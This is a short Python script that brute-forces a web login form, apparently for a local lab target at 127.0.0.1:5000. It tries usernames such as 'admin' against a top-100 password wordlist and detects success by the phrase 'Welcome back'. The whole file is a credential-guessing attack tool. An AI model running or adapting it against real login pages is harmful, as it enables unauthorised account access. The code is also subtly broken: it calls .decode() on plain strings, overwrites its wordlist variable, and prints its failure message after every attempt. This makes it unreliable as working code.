import requests
import sys

target = "http://127.0.0.1:5000"
username = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"

for username in username:
	with open(passwords, "r") as passwords_lists:
		for password in passwords_lists:
			passwords = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
			r = requests.post(target, data={"username": username, "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{} found for user '{}'!".format(password.decode(), username))
				sys.exit()
			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write("\tNo password found for for user '{}'!".format(username))
			sys.stdout.write("\n")